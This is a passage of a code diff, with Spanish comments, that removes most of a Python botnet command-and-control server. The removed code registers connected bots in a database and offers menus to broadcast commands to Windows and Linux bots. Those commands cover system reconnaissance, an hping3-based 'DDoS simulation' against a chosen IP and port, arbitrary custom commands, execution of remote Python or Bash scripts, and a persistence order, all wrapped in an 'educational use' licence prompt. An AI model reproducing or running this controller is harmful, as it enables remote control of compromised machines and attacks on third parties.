timeout=1).status_code == 200:\r\n-                logging.info(\"Entorno de cloud computing detectado.\")\r\n-                return True\r\n-        except requests.exceptions.RequestException:\r\n-            pass\r\n-\r\n-        try:\r\n-            # Google Cloud Metadata\r\n-            if requests.get(\"http://metadata.google.internal/\", timeout=1).status_code == 200:\r\n-                logging.info(\"Entorno de cloud computing detectado.\")\r\n-                return True\r\n-        except requests.exceptions.RequestException:\r\n-            pass\r\n-\r\n-        return False\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al detectar el entorno cloud: {e}\")\r\n-        return False\r\n-\r\n-def esRedPrivada(ip):\r\n-    \"\"\"Indica si una IP es de una red privada o no.\r\n-\r\n-    La funci贸n intenta crear un objeto ipaddress.ip_address() con la IP dada y devuelve\r\n-    el resultado de llamar a su m茅todo is_private(). Si la IP no es v谩lida,\r\n-    devuelve False.\r\n-\r\n-    Parameters:\r\n-    ip (str): La IP a verificar.\r\n-\r\n-    Returns:\r\n-    bool: True si la IP es de una red privada, False si no lo es.\r\n-    \"\"\"\r\n-    try:\r\n-        result = ipaddress.ip_address(ip).is_private\r\n-        logging.info(f\"Verificaci贸n de red privada para la IP: {ip}\")\r\n-        return result\r\n-    except ValueError as e:\r\n-        logging.error(f\"Error al verificar si la IP es privada: {e}\")\r\n-        return False\r\n-\r\n-def verificar_eula(tipo):\r\n-    \"\"\"\r\n-    Verifica si el usuario ha aceptado la licencia antes de ejecutar el programa.\r\n-    \r\n-    :param tipo: \"servidor\" o \"cliente\" para determinar qu茅 EULA verificar.\r\n-    \"\"\"\r\n-    try:\r\n-        if tipo not in [\"servidor\", \"cliente\"]:\r\n-            raise ValueError(\"Tipo de EULA no v谩lido. Debe ser 'servidor' o 'cliente'.\")\r\n-\r\n-        # Ruta para el archivo EULA en la carpeta docs\r\n-        BASE_DIR = os.path.dirname(os.path.abspath(__file__))\r\n-        eula_path = os.path.join(BASE_DIR, \"..\", \"docs\", f\"eula_{tipo}.txt\")\r\n-\r\n-        # Si no existe, lo crea\r\n-        if not os.path.exists(eula_path):\r\n-            with open(eula_path, \"w\") as f:\r\n-                f.write(\"ACCEPTED=False\")\r\n-\r\n-        # Leer si ya acept贸\r\n-        with open(eula_path, \"r\") as f:\r\n-            for linea in f:\r\n-                if \"ACCEPTED=True\" in linea:\r\n-                    logging.info(f\"Verificaci贸n de EULA para el tipo: {tipo}\")\r\n-                    return True\r\n-\r\n-        # Mostrar Acuerdo de Licencia\r\n-        print(\"\\n\" + \"=\"*50)\r\n-        print(f\"  ACUERDO DE LICENCIA ({tipo.upper()}) \")\r\n-        print(\"=\"*50)\r\n-        print(\"\\nEste software es exclusivamente para prop贸sitos educativos y de investigaci贸n.\")\r\n-        print(\"El uso en redes ajenas sin autorizaci贸n est谩 prohibido.\")\r\n-        print(\"El usuario debe cumplir con las leyes de su pa铆s.\")\r\n-        print(\"No se permite el uso de este software en redes p煤blicas.\")\r\n-        print(\"El autor no se hace responsable del uso indebido.\\n\")\r\n-        print(\"EL SOFTWARE NO FUNCIONAR FUERA DE UNA RED PRIVADA.\\n\")\r\n-        \r\n-        print(\"  QUEDA TERMINANTEMENTE PROHIBIDO:\")\r\n-        print(\"   - Usarlo con intenciones maliciosas.\")\r\n-        print(\"   - Ejecutarlo en infraestructuras cr铆ticas sin permiso.\")\r\n-        print(\"   - Modificarlo para evadir restricciones.\")\r\n-        print(\"   - Distribuirlo con fines ilegales o comerciales.\\n\")\r\n-        \r\n-        print(\"  Al escribir 'ACEPTO', el usuario declara que asume toda la responsabilidad sobre su uso.\\n\")\r\n-        \r\n-        respuesta = input(\"Escriba 'ACEPTO' para continuar: \").strip().upper()\r\n-        \r\n-        if respuesta == \"ACEPTO\":\r\n-            with open(eula_path, \"w\") as f:\r\n-                f.write(\"ACCEPTED=True\")\r\n-            logging.info(f\"Verificaci贸n de EULA para el tipo: {tipo}\")\r\n-            return True\r\n-        else:\r\n-            print(\"Debe aceptar la licencia para usar este software.\")\r\n-            exit()\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al verificar el EULA: {e}\")\r\n-        exit()\r\n-\r\n-def agregar_o_actualizar_bot_en_db(config, identificador, ip, hostname, os):\r\n-    \"\"\"\r\n-    Agrega un bot a la base de datos SQLite o actualiza su IP si ya existe.\r\n-\r\n-    :param config: Un objeto con la configuraci贸n del servidor.\r\n-    :param identificador: El identificador 煤nico del bot.\r\n-    :type identificador: str\r\n-    :param ip: La direcci贸n IP del bot.\r\n-    :type ip: str\r\n-    :param hostname: El nombre del host del bot.\r\n-    :type hostname: str\r\n-    :param os: El sistema operativo del bot.\r\n-    :type os: str\r\n-    \"\"\"\r\n-    try:\r\n-        conn = sqlite3.connect(config[\"DB_PATH\"], detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES)\r\n-        cursor = conn.cursor()\r\n-        cursor.execute(\"SELECT id FROM bots WHERE identificador = ?\", (identificador,))\r\n-        bot = cursor.fetchone()\r\n-        if bot:\r\n-            cursor.execute(\"UPDATE bots SET ip = ?, hostname = ?, os = ?, last_seen = ? WHERE identificador = ?\", (ip, hostname, os, datetime.now(), identificador))\r\n-            logging.info(f\"Bot actualizado en la base de datos: {identificador}, {ip}, {hostname}, {os}\")\r\n-        else:\r\n-            cursor.execute(\"INSERT INTO bots (identificador, ip, hostname, os, last_seen) VALUES (?, ?, ?, ?, ?)\", (identificador, ip, hostname, os, datetime.now()))\r\n-            logging.info(f\"Bot agregado a la base de datos: {identificador}, {ip}, {hostname}, {os}\")\r\n-        conn.commit()\r\n-        conn.close()\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al agregar o actualizar el bot en la base de datos: {e}\")\r\n-\r\n-def manejar_bot(conn, addr, bot_id, config):\r\n-    \"\"\"\r\n-    Maneja una conexi贸n de bot y la agrega o actualiza en la base de datos.\r\n-\r\n-    :param conn: El socket del bot conectado.\r\n-    :type conn: socket.socket\r\n-    :param addr: La direcci贸n IP y puerto del bot.\r\n-    :type addr: tuple\r\n-    :param bot_id: El ID del bot, que se usar谩 para identificarlo.\r\n-    :type bot_id: int\r\n-    :param config: Un objeto con la configuraci贸n del servidor.\r\n-    \"\"\"\r\n-    try:\r\n-        ip, port = addr\r\n-        hostname = socket.gethostbyaddr(ip)[0]\r\n-        logging.info(f\"Bot {bot_id} conectado desde {addr}\")\r\n-        print(f\"Bot {bot_id} conectado desde {addr}\")\r\n-\r\n-        # Recibir identificador 煤nico\r\n-        identificador = conn.recv(1024).decode(\"utf-8\").strip()\r\n-        logging.info(f\"Identificador 煤nico recibido: {identificador}\")\r\n-\r\n-        # Detectar sistema operativo\r\n-        try:\r\n-            conn.send(\"detect_os\".encode(\"utf-8\"))\r\n-            os_info = conn.recv(1024).decode(\"utf-8\").strip().lower()\r\n-            os = \"windows\" if \"windows\" in os_info else \"linux\"\r\n-            sistemas_operativos[conn] = os\r\n-            print(f\"Bot {bot_id} identificado como {os.capitalize()}\")\r\n-        except Exception as e:\r\n-            print(f\"Error al detectar OS de {addr}: {e}\")\r\n-            os = \"desconocido\"\r\n-\r\n-        agregar_o_actualizar_bot_en_db(config, identificador, ip, hostname, os)\r\n-\r\n-        while True:\r\n-            try:\r\n-                data = conn.recv(4096).decode(\"utf-8\", errors=\"ignore\").strip()\r\n-                if not data:\r\n-                    continue\r\n-\r\n-                # Guardar la respuesta en el diccionario sin imprimirla\r\n-                respuestas_bots[bot_id] = data\r\n-                actualizar_bot_en_db(config, ip)\r\n-                agregar_respuesta_en_db(config, bot_id, data)\r\n-\r\n-            except socket.timeout:\r\n-                print(f\"Tiempo de espera agotado con {addr}.\")\r\n-            except Exception as e:\r\n-                print(f\"Error con {addr}: {e}\")\r\n-                break\r\n-\r\n-        # Manejo de desconexi贸n\r\n-        conn.close()\r\n-        logging.info(f\"Bot {bot_id} desconectado\")\r\n-        print(f\"Bot {bot_id} desconectado\")\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al manejar el bot {bot_id}: {e}\")\r\n-    finally:\r\n-        conn.close()\r\n-        logging.info(f\"Bot {bot_id} desconectado\")\r\n-        print(f\"Bot {bot_id} desconectado\")\r\n-\r\n-def servidor_CnC(HOST, PORT):\r\n+def servidor_CnC(HOST, PORT, config):\r\n     global server_running\r\n     \"\"\"\r\n     Inicia el servidor de Comando y Control (CnC). Crea un socket, lo asocia\r\n     a la IP y el puerto especificados y lo pone en escucha. Luego, crea un hilo\r\n     para aceptar conexiones y entra en un bucle para mostrar un men煤 principal\r\n     que permite al usuario interactuar con los bots conectados.\r\n \r\n-    :return: None\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(f\"Iniciando servidor CnC en {HOST}:{PORT}\")\r\n-        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Crear el socket\r\n-        server.bind((HOST, PORT)) # Asociar el socket a la IP y el puerto\r\n-        server.listen(5) # Escuchar conexiones\r\n-        print(f\"Escuchando en {HOST}:{PORT}...\") # Imprimir que el servidor esta escuchando\r\n-        \r\n-        threading.Thread(target=aceptar_conexiones, args=(server,)).start() # Crear un hilo para aceptar conexiones\r\n-\r\n-        while server_running:\r\n-            print(\"\\nMen煤 Principal:\")\r\n-            print(\"1. Listar bots conectados\")\r\n-            print(\"2. Enviar comandos\")\r\n-            print(\"3. Cerrar conexi贸n con un bot\")\r\n-            print(\"4. Salir\")\r\n-            opcion = input(\"Seleccione una opci贸n: \")\r\n-\r\n-            if opcion == \"1\":\r\n-                listar_bots()\r\n-            elif opcion == \"2\":\r\n-                menu_comandos()\r\n-            elif opcion == \"3\":\r\n-                cerrar_conexion_bots()\r\n-            elif opcion == \"4\":\r\n-                logging.info(\"Servidor CnC detenido\")\r\n-                print(\"Saliendo de la consola...\")\r\n-                server_running = False\r\n-                server.close()\r\n-                break\r\n-            else:\r\n-                print(\"Opci贸n no v谩lida. Intente de nuevo.\")\r\n-        \r\n-        # Esperar a que todos los hilos de bots terminen\r\n-        for bot in bots:\r\n-            bot.close()\r\n-        for thread in threading.enumerate():\r\n-            if thread is not threading.current_thread():\r\n-                thread.join()\r\n-    except Exception as e:\r\n-        logging.error(f\"Error en el servidor CnC: {e}\")\r\n-\r\n-def aceptar_conexiones(server):\r\n-    global server_running\r\n-    \"\"\"\r\n-    Acepta conexiones de bots y las asigna a un hilo para manejarlas.\r\n-\r\n-    Este hilo infinito espera conexiones de bots y las asigna a la lista de\r\n-    bots conectados. A cada bot se le asigna un ID 煤nico y se crea un hilo\r\n-    para manejar la conexi贸n. El hilo maneja_bot se encarga de recibir los\r\n-    mensajes del bot, detectar el sistema operativo y ejecutar comandos\r\n-    enviados por el usuario.\r\n-\r\n-    :param server: El socket del servidor C&C.\r\n-    :type server: socket.socket\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(\"Aceptando conexiones de bots\")\r\n-        bot_id = 1 # Contador de bots\r\n-        while server_running:\r\n-            try:\r\n-                conn, addr = server.accept() # Aceptar la conexi贸n\r\n-                bots.append(conn) # Agregar el bot a la lista\r\n-                bot_ids[conn] = bot_id # Asignar el ID del bot\r\n-                threading.Thread(target=manejar_bot, args=(conn, addr, bot_id)).start() # Crear un hilo para manejar la conexi贸n\r\n-                bot_id += 1 # Incrementar el contador de bots\r\n-            except OSError:\r\n-                if not server_running:\r\n-                    break\r\n-                else:\r\n-                    raise\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al aceptar conexiones: {e}\")\r\n-\r\n-def listar_bots():\r\n-    \"\"\"\r\n-    Muestra la lista de bots conectados al servidor C&C, incluyendo\r\n-    su identificador, sistema operativo y direcci贸n IP y puerto de\r\n-    conexi贸n.\r\n-    \r\n-    :return: None\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(\"Listando bots conectados\")\r\n-        if bots:\r\n-            print(\"\\nBots conectados:\")\r\n-            for bot in bots: # Recorrer la lista de bots\r\n-                so = sistemas_operativos.get(bot, \"Desconocido\") # Obtener el SO del bot\r\n-                print(f\"Bot {bot_ids[bot]} ({so.capitalize()}): {bot.getpeername()}\") # Imprimir el bot\r\n-        else:\r\n-            print(\"No hay bots conectados.\")\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al listar bots: {e}\")\r\n-\r\n-def menu_comandos():\r\n-    \r\n-    \"\"\"\r\n-    Muestra el men煤 de comandos disponibles para ejecutar en los bots\r\n-    conectados y permite al usuario seleccionar una orden para ejecutar en\r\n-    todos los bots o en algunos seleccionados manualmente.\r\n-\r\n-    :return: None\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(\"Mostrando men煤 de comandos\")\r\n-        if not bots:\r\n-            print(\"No hay bots conectados.\")\r\n-            return\r\n-\r\n-        print(\"\\nSeleccione el tipo de comandos:\")\r\n-        print(\"1. Comandos b谩sicos\")\r\n-        print(\"2. Comandos avanzados\")\r\n-        tipo_comando = input(\"Ingrese su opci贸n: \")\r\n-\r\n-        if tipo_comando == \"1\":\r\n-            print(\"\\nComandos b谩sicos disponibles:\")\r\n-            print(\"1. Obtener informaci贸n del sistema\")\r\n-            print(\"2. Consultar conexiones de red\")\r\n-            print(\"3. Ver procesos en ejecuci贸n\")\r\n-            print(\"4. Listar archivos en el directorio actual\")\r\n-            print(\"5. Obtener la IP p煤blica\")\r\n-            orden = input(\"Seleccione una orden: \")\r\n-            comando_windows = \"\"\r\n-            comando_linux = \"\"\r\n-\r\n-            if orden == \"1\":\r\n-                comando_windows = \"systeminfo\"\r\n-                comando_linux = \"uname -a && lsb_release -a\"\r\n-            elif orden == \"2\":\r\n-                comando_windows = \"netstat -ano\"\r\n-                comando_linux = \"netstat -tunapl\"\r\n-            elif orden == \"3\":\r\n-                comando_windows = \"tasklist\"\r\n-                comando_linux = \"ps aux\"\r\n-            elif orden == \"4\":\r\n-                comando_windows = \"dir\"\r\n-                comando_linux = \"ls -lah\"\r\n-            elif orden == \"5\":\r\n-                comando_windows = \"curl ifconfig.me\"\r\n-                comando_linux = \"curl ifconfig.me\"\r\n-            else:\r\n-                print(\"Opci贸n no v谩lida.\")\r\n-                return\r\n-\r\n-            enviar_comando(comando_windows, comando_linux)\r\n-\r\n-        elif tipo_comando == \"2\":\r\n-            print(\"\\nComandos avanzados disponibles:\")\r\n-            print(\"1. Simular ataque DDoS\")\r\n-            print(\"2. Detener simulaci贸n de DDoS\")\r\n-            print(\"3. Ejecutar un comando personalizado\")\r\n-            print(\"4. Ejecutar un script remoto\")\r\n-            print(\"5. Intentar asegurar la persistencia\")\r\n-            orden = input(\"Seleccione una orden: \")\r\n-            comando_windows = \"\"\r\n-            comando_linux = \"\"\r\n-\r\n-            if orden == \"1\":\r\n-                objetivo = input(\"Ingrese la direcci贸n IP del objetivo: \")\r\n-                puerto = input(\"Ingrese el puerto del objetivo: \")\r\n-                protocolo = input(\"Ingrese el protocolo (TCP/UDP): \").upper()\r\n-                if protocolo not in [\"TCP\", \"UDP\"]:\r\n-                    print(\"Protocolo no v谩lido.\")\r\n-                    return\r\n-                comando_windows = f\"powershell -Command \\\"for ($i=0; $i -lt 10; $i++) {{Start-Sleep -Seconds 10; Test-NetConnection -ComputerName {objetivo} -Port {puerto} -InformationLevel 'Detailed'}}\\\"\"\r\n-                comando_linux = f\"for i in {{1..10}}; do hping3 -S -p {puerto} -c 1 {objetivo}; sleep 10; done\"\r\n-                enviar_comando(comando_windows, comando_linux, \"ddos_start\")\r\n-            elif orden == \"2\":\r\n-                comando_windows = \"stop_ddos\"\r\n-                comando_linux = \"stop_ddos\"\r\n-                enviar_comando(comando_windows, comando_linux, \"ddos_stop\")\r\n-            elif orden == \"3\":\r\n-                comando_windows = input(\"Ingrese el comando personalizado para Windows: \")\r\n-                comando_linux = input(\"Ingrese el comando personalizado para Linux: \")\r\n-                enviar_comando(comando_windows, comando_linux)\r\n-            elif orden == \"4\":\r\n-                print(\"Seleccione el tipo de script:\")\r\n-                print(\"1. Python\")\r\n-                print(\"2. Bash\")\r\n-                print(\"3. Otro (especificar)\")\r\n-                \r\n-                tipo = input(\"Ingrese la opci贸n: \")\r\n-\r\n-                if tipo == \"1\":\r\n-                    extension = \"py\"\r\n-                    interprete_linux = \"python3 -c\"\r\n-                    interprete_windows = \"python -c\"\r\n-                elif tipo == \"2\":\r\n-                    extension = \"sh\"\r\n-                    interprete_linux = \"bash -c\"\r\n-                    interprete_windows = \"powershell -Command\"\r\n-                elif tipo == \"3\":\r\n-                    extension = input(\"Ingrese la extensi贸n del script (ejemplo: ps1, rb, pl): \")\r\n-                    interprete_linux = input(\"Ingrese el comando para ejecutarlo en Linux: \")\r\n-                    interprete_windows = input(\"Ingrese el comando para ejecutarlo en Windows: \")\r\n-                else:\r\n-                    print(\"Opci贸n inv谩lida.\")\r\n-                    return\r\n-\r\n-                print(\"\\n驴C贸mo desea proporcionar el script?\")\r\n-                print(\"1. Escribirlo aqu铆\")\r\n-                print(\"2. Proporcionar la ruta de un archivo\")\r\n-                \r\n-                metodo = input(\"Ingrese la opci贸n: \")\r\n-\r\n-                if metodo == \"1\":\r\n-                    print(f\"Escriba su script en {extension}. Finalice con 'EOF' en una l铆nea nueva:\")\r\n-                    lineas = []\r\n-                    while True:\r\n-                        try:\r\n-                            linea = input()\r\n-                            if linea.strip().upper() == \"EOF\":  # Detectar EOF\r\n-                                break\r\n-                            lineas.append(linea)\r\n-                        except KeyboardInterrupt:  # Capturar Ctrl+C para salir\r\n-                            print(\"\\nEntrada cancelada.\")\r\n-                            return\r\n-                    script = \"\\n\".join(lineas)  # Unir l铆neas en una sola cadena\r\n-                elif metodo == \"2\":\r\n-                    ruta = input(\"Ingrese la ruta del archivo: \")\r\n-                    try:\r\n-                        with open(ruta, \"r\", encoding=\"utf-8\") as archivo:\r\n-                            script = archivo.read()\r\n-                    except Exception as e:\r\n-                        print(f\"Error al leer el archivo: {e}\")\r\n-                        return\r\n-                else:\r\n-                    print(\"Opci贸n inv谩lida.\")\r\n-                    return\r\n-\r\n-                # Reemplazar comillas para evitar problemas con la ejecuci贸n remota\r\n-                script = script.replace('\"', r'\\\"').replace(\"'\", r\"\\'\")\r\n-\r\n-                comando_windows = f'{interprete_windows} \"{script}\"'\r\n-                comando_linux = f\"{interprete_linux} '{script}'\"\r\n-\r\n-                enviar_comando(comando_windows, comando_linux)\r\n-            elif orden == \"5\":\r\n-                print(\"\\nIntentando asegurar la persistencia en los bots seleccionados...\")\r\n-                comando_windows = \"persistencia\"\r\n-                comando_linux = \"persistencia\"\r\n-                enviar_comando(comando_windows, comando_linux)\r\n-            else:\r\n-                print(\"Opci贸n no v谩lida.\")\r\n-                return\r\n-        else:\r\n-            print(\"Opci贸n no v谩lida.\")\r\n-            return\r\n-    except Exception as e:\r\n-        logging.error(f\"Error en el men煤 de comandos: {e}\")\r\n-\r\n-def enviar_comando(comando_windows, comando_linux, tipo_comando=None):\r\n-    \r\n-    \"\"\"\r\n-    Env铆a un comando a un conjunto de bots seleccionados.\r\n-\r\n-    :param comando_windows: El comando a enviar a los bots Windows.\r\n-    :type comando_windows: str\r\n-    :param comando_linux: El comando a enviar a los bots Linux.\r\n-    :type comando_linux: str\r\n-    :param tipo_comando: El tipo de comando a enviar (opcional).\r\n-    :type tipo_comando: str\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(\"Enviando comando a los bots seleccionados\")\r\n-        if not bots:\r\n-            print(\"No hay bots conectados.\")\r\n-            return\r\n-\r\n-        print(\"\\nSeleccione a qu茅 bots enviar el comando:\")\r\n-        print(\"1. Todos los bots\")\r\n-        print(\"2. Solo bots Windows\")\r\n-        print(\"3. Solo bots Linux\")\r\n-        print(\"4. Un bot espec铆fico\")\r\n-        print(\"5. Lista de bots espec铆ficos\")\r\n-\r\n-        seleccion = input(\"Ingrese su opci贸n: \")\r\n-        bots_seleccionados = []\r\n-\r\n-        if seleccion == \"1\":\r\n-            bots_seleccionados = bots\r\n-        elif seleccion == \"2\":\r\n-            bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == \"windows\"]\r\n-        elif seleccion == \"3\":\r\n-            bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == \"linux\"]\r\n-        elif seleccion == \"4\":\r\n-            listar_bots()\r\n-            try:\r\n-                bot_id = int(input(\"Ingrese el ID del bot: \"))\r\n-                bot = next((b for b in bots if bot_ids.get(b) == bot_id), None)\r\n-                if bot:\r\n-                    bots_seleccionados.append(bot)\r\n-                else:\r\n-                    print(\"ID de bot no v谩lido.\")\r\n-                    return\r\n-            except ValueError:\r\n-                print(\"ID inv谩lido. Debe ingresar un n煤mero.\")\r\n-                return\r\n-        elif seleccion == \"5\":\r\n-            listar_bots()\r\n-            try:\r\n-                bot_ids_seleccionados = [int(id.strip()) for id in input(\"Ingrese los IDs de los bots separados por comas: \").split(\",\") if id.strip().isdigit()]\r\n-                bots_seleccionados = [b for b in bots if bot_ids.get(b) in bot_ids_seleccionados]\r\n-                if not bots_seleccionados:\r\n-                    print(\"No se encontraron bots con los IDs proporcionados.\")\r\n-                    return\r\n-            except ValueError:\r\n-                print(\"Entrada inv谩lida. Debe ingresar n煤meros separados por comas.\")\r\n-                return\r\n-        else:\r\n-            print(\"Opci贸n no v谩lida.\")\r\n-            return\r\n-\r\n-        respuestas = {}\r\n-\r\n-        for bot in bots_seleccionados:\r\n-            respuestas[bot] = enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando)\r\n-\r\n-        print(\"\\n--- Respuestas de los bots ---\\n\")\r\n-        for bot, respuesta in respuestas.items():\r\n-            bot_info = f\"Bot {bot_ids.get(bot, 'Desconocido')} ({sistemas_operativos.get(bot, 'Desconocido').capitalize()})\"\r\n-            print(f\"[] {bot_info}: {respuesta}\")\r\n-\r\n-        print(\"\\n--- Volviendo al men煤 principal ---\\n\")\r\n-        time.sleep(2)\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al enviar comando: {e}\")\r\n-\r\n-def enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando=None):\r\n-    \r\n-    \"\"\"\r\n-    Env铆a un comando a un bot espec铆fico basado en su sistema operativo.\r\n-\r\n-    Determina el sistema operativo del bot y env铆a el comando adecuado \r\n-    para Windows o Linux. Espera una respuesta del bot por un tiempo \r\n-    m谩ximo definido y devuelve la respuesta si se recibe. Maneja la \r\n-    desconexi贸n del bot si ocurre durante la comunicaci贸n.\r\n-\r\n-    :param bot: El socket del bot al que se enviar谩 el comando.\r\n-    :param comando_windows: El comando a ejecutar si el bot es Windows.\r\n-    :param comando_linux: El comando a ejecutar si el bot es Linux.\r\n-    :param tipo_comando: El tipo de comando a enviar (opcional).\r\n-    :type tipo_comando: str\r\n-    :return: La respuesta del bot o un mensaje de error si no se recibe \r\n-             respuesta o si el bot se desconecta.\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(f\"Enviando comando al bot {bot_ids.get(bot, 'Desconocido')}\")\r\n-        so = sistemas_operativos.get(bot, \"desconocido\")\r\n-        comando = comando_windows if so == \"windows\" else comando_linux\r\n-        bot_id = bot_ids.get(bot, \"Desconocido\")\r\n-\r\n-        try:\r\n-            bot.send(comando.encode('utf-8'))\r\n-            print(f\"\\n[] Orden enviada a bot {bot_id} ({so.capitalize()})\\n\")\r\n-\r\n-            # Esperar hasta que `manejar_bot()` almacene la respuesta\r\n-            tiempo_maximo = 5  # Segundos\r\n-            tiempo_inicial = time.time()\r\n-\r\n-            while time.time() - tiempo_inicial < tiempo_maximo:\r\n-                if bot_id in respuestas_bots:\r\n-                    respuesta = respuestas_bots.pop(bot_id)  # Tomar y eliminar la respuesta\r\n-                    if tipo_comando == \"ddos_start\":\r\n-                        ddos_status[bot_id] = \"running\"\r\n-                    elif tipo_comando == \"ddos_stop\":\r\n-                        ddos_status[bot_id] = \"stopped\"\r\n-                    print(f\"\\n--- Respuesta del Bot {bot_id} ---\\n{respuesta}\\n\")\r\n-                    return respuesta if respuesta else \"[INFO] Comando ejecutado sin salida\"\r\n-                time.sleep(0.5)  # Esperar 0.5 segundos antes de verificar nuevamente\r\n-\r\n-            return \"[ERROR] No hubo respuesta del bot (Timeout)\"\r\n-\r\n-        except (socket.error, BrokenPipeError):\r\n-            print(f\"[] Bot {bot_id} desconectado.\")\r\n-            if bot in bots:\r\n-                bots.remove(bot)\r\n-            if bot in bot_ids:\r\n-                del bot_ids[bot]\r\n-            if bot in sistemas_operativos:\r\n-                del sistemas_operativos[bot]\r\n-            return \"[ERROR] El bot se ha desconectado.\"\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al enviar comando al bot {bot_ids.get(bot, 'Desconocido')}: {e}\")\r\n-\r\n-def cerrar_conexion_bots():\r\n-    \r\n-    \"\"\"\r\n-    Cierra la conexi贸n con un bot seleccionado por el usuario.\r\n-    \r\n-    El usuario puede seleccionar a los bots a los que quiere cerrar la conexi贸n\r\n-    mediante un ID o bien escribir \"todos\" para cerrar la conexi贸n con todos\r\n-    los bots conectados.\r\n-    \r\n-    :return: None\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(\"Cerrando conexi贸n con los bots seleccionados\")\r\n-        if not bots:\r\n-            print(\"No hay bots conectados.\")\r\n-            return\r\n-\r\n-        listar_bots()\r\n-        \r\n-        try:\r\n-            bot_id = int(input(\"Seleccione el ID del bot cuya conexi贸n quiere cerrar: \")) # Obtener el ID del bot seleccionado\r\n-        except ValueError:\r\n-            print(\"ID inv谩lido. Debe ingresar un n煤mero.\")\r\n-            return\r\n-\r\n-        bot = next((b for b in bots if bot_ids.get(b) == bot_id), None) # Buscar el bot con el ID correspondiente\r\n-        \r\n-        if not bot: # Si no se encuentra el bot\r\n-            print(f\"ID de bot {bot_id} no v谩lido.\") # Imprimir un mensaje de error\r\n-            return\r\n-\r\n-        try:\r\n-            bot.close() # Cerrar la conexi贸n\r\n-            print(f\"Conexi贸n con el bot {bot_id} cerrada.\") # Imprimir un mensaje de confirmaci贸n\r\n-        except Exception as e:\r\n-            print(f\"Error al cerrar la conexi贸n con el bot {bot_id}: {e}\")\r\n-\r\n-        if bot in bots:\r\n-            bots.remove(bot) # Eliminar el bot de la lista\r\n-\r\n-        if bot in bot_ids:\r\n-            del bot_ids[bot] # Eliminar el ID del bot\r\n-\r\n-        if bot in sistemas_operativos:\r\n-            del sistemas_operativos[bot] # Eliminar el SO del bot\r\n-\r\n-        print(f\"Bot {bot_id} eliminado correctamente del sistema.\")\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al cerrar conexi贸n con los bots: {e}\")\r\n-\r\n-def cargar_configuracion():\r\n-    \r\n-    \"\"\"\r\n-    Carga la configuraci贸n del servidor desde un archivo \"config.ini\" ubicado\r\n-    en el directorio \"config\" del proyecto.\r\n-\r\n-    La configuraci贸n se almacena en un objeto con las siguientes claves:\r\n-        * BASE_DIR: Directorio base del proyecto.\r\n-        * HOST: Direcci贸n IP del servidor.\r\n-        * PORT: Puerto de escucha del servidor.\r\n-        * MAX_CONNECTIONS: N煤mero m谩ximo de conexiones permitidas.\r\n-        * DB_PATH: Ruta del archivo de la base de datos.\r\n-        * SECRET_KEY: Clave secreta para la autenticaci贸n.\r\n-        * HASH_ALGORITHM: Algoritmo de hash para la autenticaci贸n.\r\n-        * LOG_LEVEL: Nivel de log (DEBUG, INFO, WARNING, ERROR, CRITICAL).\r\n-        * SERVER_LOG_FILE: Ruta del archivo de log.\r\n-\r\n-    Si no se encuentra el archivo de configuraci贸n o hay un error al leerlo,\r\n-    se muestra un mensaje de error y se sale del programa con un estado de\r\n-    error.\r\n-\r\n-    :return: Un objeto con la configuraci贸n cargada.\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(\"Cargando configuraci贸n del servidor\")\r\n-        BASE_DIR = os.path.dirname(os.path.abspath(__file__))\r\n-        CONFIG_DIR = os.path.join(BASE_DIR, \"..\", \"config\")\r\n-        CONFIG_PATH = os.path.join(CONFIG_DIR, \"config.ini\")\r\n-\r\n-        if not os.path.exists(CONFIG_PATH):\r\n-            raise FileNotFoundError(f\"[ERROR] No se encontr贸 el archivo de configuraci贸n: {CONFIG_PATH}\")\r\n-\r\n-        config = configparser.ConfigParser()\r\n-        config.read(CONFIG_PATH)\r\n-\r\n-        return {\r\n-            \"BASE_DIR\": BASE_DIR,\r\n-            \"HOST\": config.get(\"NETWORK\", \"HOST\"),\r\n-            \"PORT\": config.getint(\"NETWORK\", \"PORT\"),\r\n-            \"MAX_CONNECTIONS\": config.getint(\"NETWORK\", \"MAX_CONNECTIONS\"),\r\n-            \"DB_PATH\": os.path.join(BASE_DIR, config.get(\"DATABASE\", \"DB_PATH\")),\r\n-            \"SECRET_KEY\": config.get(\"SECURITY\", \"SECRET_KEY\"),\r\n-            \"HASH_ALGORITHM\": config.get(\"SECURITY\", \"HASH_ALGORITHM\"),\r\n-            \"LOG_LEVEL\": config.get(\"LOGGING\", \"LOG_LEVEL\"),\r\n-            \"SERVER_LOG_FILE\": os.path.join(BASE_DIR, \"..\", config.get(\"LOGGING\", \"LOG_DIR\"), config.get(\"LOGGING\", \"SERVER_LOG_FILE\"))\r\n-        }\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al cargar la configuraci贸n: {e}\")\r\n-        exit(1)\r\n-\r\n-def iniciar_servidor():\r\n-    \"\"\"\r\n-    Inicializa el servidor de Comando y Control (C2) verificando primero\r\n-    que no se ejecute en una red privada y mostrando un aviso de EULA.\r\n-\r\n-    Luego, inicializa la base de datos, configura el sistema de logging y\r\n-    lanza el servidor de C2.\r\n-\r\n-    :return: None\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(\"Iniciando servidor de Comando y Control (C2)\")\r\n-        config = cargar_configuracion()\r\n-        configurar_logging(config)  # Pasar el objeto de configuraci贸n en lugar de la cadena\r\n-        if not esRedPrivada(config[\"HOST\"]):\r\n-            